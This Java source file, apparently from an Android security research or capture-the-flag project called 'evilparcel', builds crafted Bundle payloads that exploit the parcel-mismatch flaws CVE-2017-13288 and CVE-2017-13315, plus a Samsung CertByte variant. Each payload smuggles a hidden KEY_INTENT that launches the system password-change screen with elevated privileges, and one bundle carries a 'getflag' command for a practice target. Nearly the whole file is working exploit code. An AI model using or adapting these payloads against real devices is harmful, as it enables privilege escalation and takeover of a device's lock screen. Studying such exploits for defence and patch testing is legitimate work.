package com.example.evilparcel;

import static com.example.evilparcel.MainActivity.TAG;

import android.accounts.AccountManager;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.os.Parcel;
import android.util.Log;

public class MakeBundle {

    public static Bundle makeCVE_2017_13288(Intent intent){
        Bundle evil = new Bundle();
        Parcel bndlData=Parcel.obtain();
        Parcel pcelData=Parcel.obtain();
        pcelData.writeInt(2);  // 键值对的数量：2
        // 写入第一个键值对
        pcelData.writeString("mismatch");
        pcelData.writeInt(4);  // VAL_PARCELABLE
        pcelData.writeString("android.bluetooth.le.PeriodicAdvertisingReport"); // Class Loader
        pcelData.writeInt(1);  // syncHandle
        pcelData.writeInt(1);  // txPower
        pcelData.writeInt(1);  // rssi
        pcelData.writeInt(1);  // dataStatus
        pcelData.writeInt(1);  // flag
        pcelData.writeInt(-1); // 恶意KEY_INTENT的长度，暂时写入-1

        int keyIntentStartPos=pcelData.dataPosition(); // KEY_INTENT的起始位置
        pcelData.writeString(AccountManager.KEY_INTENT);
        pcelData.writeInt(4);  // VAL_PARCELABLE
        pcelData.writeString("android.content.Intent");  // Class Loader
        pcelData.writeString(Intent.ACTION_RUN);  // Intent Action
        Uri.writeToParcel(pcelData,null);  // uri = null
        pcelData.writeString(null);  // mType = null
        pcelData.writeInt(0x10000000);  // Flags
        pcelData.writeString(null);  // mPackage = null
        pcelData.writeString("com.android.settings");
        pcelData.writeString("com.android.settings.password.ChooseLockPassword");
        pcelData.writeInt(0);  // mSourceBounds = null
        pcelData.writeInt(0);  // mCategories = null
        pcelData.writeInt(0);  // mSelector = null
        pcelData.writeInt(0);  // mClipData = null
        pcelData.writeInt(-2); // mContentUserHint
        pcelData.writeBundle(null);

        int keyIntentEndPos=pcelData.dataPosition(); // KEY_INTENT的终止位置
        int lengthOfKeyIntent=keyIntentEndPos-keyIntentStartPos; // 计算KEY_INTENT的长度
        pcelData.setDataPosition(keyIntentStartPos-4);  // 将指针移到KEY_INTENT长度处
        pcelData.writeInt(lengthOfKeyIntent);  // 写入KEY_INTENT的长度
        pcelData.setDataPosition(keyIntentEndPos);
        Log.d(TAG, "Length of KEY_INTENT is 0x" + Integer.toHexString(lengthOfKeyIntent)); // 0x144
        // 写入第二个键值对
        pcelData.writeString("Padding-Key");
        pcelData.writeInt(0);  // VAL_STRING
        pcelData.writeString("Padding-Value");
        int length = pcelData.dataSize();
        Log.d(TAG,"length = "+length);
        bndlData.writeInt(length);
        bndlData.writeInt(0x4c444e42);  // Bundle魔数
        bndlData.appendFrom(pcelData,0,length);
        bndlData.setDataPosition(0);
        evil.readFromParcel(bndlData);
        Log.d(TAG,evil.toString());
        return evil;
    }

    public static Bundle makeCVE_2017_13315(Intent intent){
        /*
        CVE-2017-13315
        */
        Bundle evil=new Bundle();
        Parcel bndlData = Parcel.obtain();
        Parcel pcelData = Parcel.obtain();

        pcelData.writeInt(3); // 键值对的数量：3
        // 写入第一个键值对
        pcelData.writeString("mismatch");
        pcelData.writeInt(4);  // VAL_PACELABLE
        pcelData.writeString("com.android.internal.telephony.DcParamObject"); // Class Loader
        pcelData.writeInt(1);  //mSubId

        // 写入第二个键值对
        pcelData.writeInt(1);
        pcelData.writeInt(6);
        pcelData.writeInt(13); // VAL_BYTEARRAY
        //pcelData.writeInt(0x144); //KEY_INTENT:intent的长度
        pcelData.writeInt(-1); // KEY_INTENT的长度，暂时写入-1，后续再进行修改
        int keyIntentStartPos = pcelData.dataPosition(); // KEY_INTENT的起始位置
        // 恶意Intent隐藏在byte数组中
        pcelData.writeString(AccountManager.KEY_INTENT);
        pcelData.writeInt(4);
        pcelData.writeString("android.content.Intent");// Class Loader
        pcelData.writeString(Intent.ACTION_RUN); // Intent Action
        Uri.writeToParcel(pcelData, null); // Uri = null
        pcelData.writeString(null); // mType = null
        pcelData.writeInt(0x10000000); // Flags
        pcelData.writeString(null); // mPackage = null
        pcelData.writeString("com.android.settings");
        pcelData.writeString("com.android.settings.password.ChooseLockPassword");
        pcelData.writeInt(0); //mSourceBounds = null
        pcelData.writeInt(0); // mCategories = null
        pcelData.writeInt(0); // mSelector = null
        pcelData.writeInt(0); // mClipData = null
        pcelData.writeInt(-2); // mContentUserHint
        pcelData.writeBundle(null);

        int keyIntentEndPos = pcelData.dataPosition(); // KEY_INTENT的终止位置
        int lengthOfKeyIntent = keyIntentEndPos - keyIntentStartPos; // 计算KEY_INTENT的长度
        pcelData.setDataPosition(keyIntentStartPos - 4);  // 将指针移到KEY_INTENT长度处
        pcelData.writeInt(lengthOfKeyIntent);  // 写入KEY_INTENT的长度
        pcelData.setDataPosition(keyIntentEndPos);
        Log.d(TAG, "Length of KEY_INTENT is 0x" + Integer.toHexString(lengthOfKeyIntent));

        // 写入第三个键值对
        pcelData.writeString("Padding-Key");
        pcelData.writeInt(0); // VAL_STRING
        pcelData.writeString("Padding-Value"); //


        int length  = pcelData.dataSize();
        Log.d(TAG, "length is " + Integer.toHexString(length));
        bndlData.writeInt(length);
        bndlData.writeInt(0x4c444E42);
        bndlData.appendFrom(pcelData, 0, length);
        bndlData.setDataPosition(0);
        evil.readFromParcel(bndlData);
        Log.d(TAG, evil.toString());
        return evil;

    }

    public static Bundle makeMessages(Intent intent){
        Bundle bundle = new Bundle();
        Parcel pcelData=Parcel.obtain();
        Parcel bndlData=Parcel.obtain();
        pcelData.writeInt(2);  // 键值对的数量：2
        pcelData.writeString("vulclass");
        pcelData.writeInt(4);  // VAL_PARCELABLE
        pcelData.writeString("com.example.evilparcel.Message"); // Class Loader

        pcelData.writeString("bssid");
        pcelData.writeInt(1);
        pcelData.writeInt(1);
        pcelData.writeInt(1);
        pcelData.writeInt(1);
        pcelData.writeInt(1);
        pcelData.writeInt(1);
        pcelData.writeInt(1);
        pcelData.writeLong(1);
        pcelData.writeInt(1);
        pcelData.writeInt(1);
        pcelData.writeByte((byte) 1);
        pcelData.writeLong(1);
        pcelData.writeLong(1);
        pcelData.writeLong( 1);
        // 写入第二个键值对
        pcelData.writeString("command");
        pcelData.writeInt(0);  // VAL_STRING
        pcelData.writeString("getflag");
        int length = pcelData.dataSize();
        Log.d(TAG,"length = "+length);
        bndlData.writeInt(length);
        bndlData.writeInt(0x4c444e42);  // Bundle魔数
        bndlData.appendFrom(pcelData,0,length);
        bndlData.setDataPosition(0);
        bundle.readFromParcel(bndlData);
        return bundle;

    }
    public static Bundle makeBundleForSamsangSinceP(Intent intent){
        Bundle bundle = new Bundle();
        Parcel obtain = Parcel.obtain();
        Parcel obtain2 = Parcel.obtain();
        Parcel obtain3 = Parcel.obtain();

        //init obtain3
        obtain3.writeInt(3);
        obtain3.writeInt(13);
        obtain3.writeInt(73);
        obtain3.writeInt(3);
        obtain3.writeInt(0);
        obtain3.writeInt(0);
        obtain3.writeInt(0);
        obtain3.writeInt(0);
        obtain3.writeInt(0);
        obtain3.writeInt(4);
        obtain3.writeString("com.samsung.android.cepproxyks.CertByte");
        obtain3.writeInt(0);
        byte b3[] = new byte[0];
        obtain3.writeByteArray(b3);
        obtain3.writeInt(0);
        obtain3.writeInt(13);
        obtain3.writeInt(73);
        obtain3.writeInt(53);
        obtain3.writeInt(0);
        obtain3.writeInt(0);
        obtain3.writeInt(0);
        obtain3.writeInt(0);
        obtain3.writeInt(0);
        obtain3.writeInt(1);
        obtain3.writeInt(1);
        obtain3.writeInt(13);
        obtain3.writeInt(73);
        obtain3.writeInt(48);
        obtain3.writeInt(0);
        obtain3.writeInt(0);
        obtain3.writeInt(0);
        obtain3.writeInt(0);
        obtain3.writeInt(0);
        obtain3.writeInt(13);
        obtain3.writeInt(-1);
        obtain3.writeString("intent");
        obtain3.writeInt(4);
        obtain3.writeString("android.content.Intent");

        //init obtain2
        obtain2.writeInt(3);
        obtain2.writeInt(13);
        obtain2.writeInt(72);
        obtain2.writeInt(3);
        obtain2.writeInt(0);
        obtain2.writeInt(0);
        obtain2.writeInt(0);
        obtain2.writeInt(0);
        obtain2.writeInt(0);
        obtain2.writeInt(4);
        obtain2.writeString("com.samsung.android.cepproxyks.CertByte");
        obtain2.writeInt(0);
        byte b[] = new byte[0];
        obtain2.writeByteArray(b);
        obtain2.writeInt(0);
        obtain2.writeInt(13);
        obtain2.writeInt(72);
        obtain2.writeInt(53);
        obtain2.writeInt(0);
        obtain2.writeInt(0);
        obtain2.writeInt(0);
        obtain2.writeInt(0);
        obtain2.writeInt(0);
        obtain2.writeInt(1);
        obtain2.writeInt(1);
        obtain2.writeInt(13);
        obtain2.writeInt(72);
        obtain2.writeInt(48);
        obtain2.writeInt(0);
        obtain2.writeInt(0);
        obtain2.writeInt(0);
        obtain2.writeInt(0);
        obtain2.writeInt(0);
        obtain2.writeInt(13);
        obtain2.writeInt(-1);
        int dataPosition = obtain2.dataPosition();
        obtain2.writeString("intent");
        obtain2.writeInt(4);
        obtain2.writeString("android.content.Intent");
        //
        //obtain2writeToParcel(obtain3, 0);
        obtain2.appendFrom(obtain3, 0, obtain3.dataSize());
        int dataPosition2 = obtain2.dataPosition();
        obtain2.setDataPosition(dataPosition2 - 4);
        obtain2.writeInt(dataPosition2 -dataPosition);
        Log.d(TAG,"dataPosition2 -dataPosition = "+ (dataPosition2 -dataPosition));
        Log.d(TAG,"dataPosition = "+ (dataPosition));
        Log.d(TAG,"dataPosition2 = "+ (dataPosition2));
        obtain2.setDataPosition(dataPosition2);
        int dataSize = obtain2.dataSize();
        Log.d(TAG,"dataSize = "+ dataSize);
        obtain.writeInt(dataSize);
        obtain.writeInt(1279544898);
        obtain.appendFrom(obtain2, 0, dataSize);
        obtain.setDataPosition(0);
        bundle.readFromParcel(obtain);
        return bundle;
    }
}
